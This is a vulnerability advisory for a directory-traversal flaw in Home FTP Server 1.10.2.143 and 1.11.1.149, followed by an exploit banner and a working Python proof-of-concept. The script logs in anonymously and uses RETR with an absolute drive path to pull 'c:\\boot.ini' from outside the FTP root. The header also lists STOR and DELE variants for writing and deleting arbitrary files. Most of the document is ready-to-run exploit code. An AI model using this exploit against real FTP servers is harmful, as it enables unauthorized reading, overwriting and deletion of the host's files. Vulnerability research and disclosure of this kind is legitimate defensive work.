source: http://www.securityfocus.com/bid/40419/info

Home FTP Server is prone to a directory-traversal vulnerability because it fails to sufficiently sanitize user-supplied input.

Exploiting this issue can allow an attacker to download, upload, and delete arbitrary files outside of the FTP server's root directory. This may aid in further attacks.

Home FTP Server 1.10.2.143 and 1.11.1.149 are vulnerable; other versions may also be affected. 

#============================================================================================================#
#   _      _   __   __       __        _______    _____      __ __     _____     _      _    _____  __ __    #
#  /_/\  /\_\ /\_\ /\_\     /\_\     /\_______)\ ) ___ (    /_/\__/\  ) ___ (   /_/\  /\_\ /\_____\/_/\__/\  #
#  ) ) )( ( ( \/_/( ( (    ( ( (     \(___  __\// /\_/\ \   ) ) ) ) )/ /\_/\ \  ) ) )( ( (( (_____/) ) ) ) ) #
# /_/ //\\ \_\ /\_\\ \_\    \ \_\      / / /   / /_/ (_\ \ /_/ /_/ // /_/ (_\ \/_/ //\\ \_\\ \__\ /_/ /_/_/  #
# \ \ /  \ / // / // / /__  / / /__   ( ( (    \ \ )_/ / / \ \ \_\/ \ \ )_/ / /\ \ /  \ / // /__/_\ \ \ \ \  #
#  )_) /\ (_(( (_(( (_____(( (_____(   \ \ \    \ \/_\/ /   )_) )    \ \/_\/ /  )_) /\ (_(( (_____\)_) ) \ \ #
#  \_\/  \/_/ \/_/ \/_____/ \/_____/   /_/_/     )_____(    \_\/      )_____(   \_\/  \/_/ \/_____/\_\/ \_\/ #
#                                                                                                            #
#============================================================================================================#
#                                                                                                            #
# Vulnerability............Directory Traversal                                                               #
# Software.................Home FTP Server 1.10.2.143                                                        #
# Download.................http://downstairs.dnsalias.net/files/HomeFtpServerInstall.exe                     #
# Date.....................5/27/10                                                                           #
#                                                                                                            #
#============================================================================================================#
#                                                                                                            #
# Site.....................http://cross-site-scripting.blogspot.com/                                         #
# Email....................john.leitch5@gmail.com                                                            #
#                                                                                                            #
#============================================================================================================#
#                                                                                                            #
# ##Description##                                                                                            #
#                                                                                                            #
# A directory traversal vulnerability in Home FTP Server 1.10.2.143 can be exploited to read, write, and     #
# delete files outside of the ftp root directory.                                                            #
#                                                                                                            #
#                                                                                                            #
# ##Exploit##                                                                                                #
#                                                                                                            #
# RETR [Drive Letter]:\[Filename]                                                                            #
# STOR [Drive Letter]:\[Filename]                                                                            #
# DELE [Drive Letter]:\[Filename]                                                                            #
#                                                                                                            #
#                                                                                                            #
# ##Proof of Concept##                                                                                       #
#                                                                                                            #
import sys, socket, re

host = 'localhost'
port = 21
user = 'anonymous'
password = ''

timeout = 8

buffer_size = 8192

def get_data_port(s):
    s.send('PASV\r\n')
    
    resp =  s.recv(buffer_size)

    pasv_info = re.search(u'(\d+),' * 5 + u'(\d+)', resp)

    if (pasv_info == None):
        raise Exception(resp)
                    
    return int(pasv_info.group(5)) * 256 + int(pasv_info.group(6))

def retr_file(s, filename):
    pasv_port = get_data_port(s)

    if (pasv_port == None):        
        return None    

    s.send('RETR ' + filename + '\r\n')
    resp = s.recv(8192)    

    if resp[:3] != '150': raise Exception(resp)

    print resp
    
    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    
    s2.connect((host, pasv_port))
    s2.settimeout(2.0)                                     
    resp = s2.recv(8192)
    s2.close()    

    return resp

def get_file(filename):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.settimeout(timeout)

    print s.recv(buffer_size)            

    s.send('USER ' + user + '\r\n')                   
    print s.recv(buffer_size)            

    s.send('PASS ' + password + '\r\n')               
    print s.recv(buffer_size)

    print retr_file(s, filename)

    print s.recv(buffer_size)        

    s.close()

get_file('c:\\boot.ini')
